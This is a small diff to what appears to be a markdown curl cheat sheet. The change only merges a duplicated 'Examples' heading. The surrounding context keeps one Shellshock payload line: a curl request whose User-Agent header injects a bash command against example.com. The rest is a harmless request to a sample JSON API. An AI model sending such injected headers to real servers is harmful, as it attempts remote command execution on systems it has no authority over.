@@ -131,9 +131,8 @@
 - `curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" https://example.com`
 
 ---
-## Examples
-## Examples
 
+## Examples
 -> Get a single resource via URI:  
 - `curl https://jsonplaceholder.typicode.com/posts/1`
 
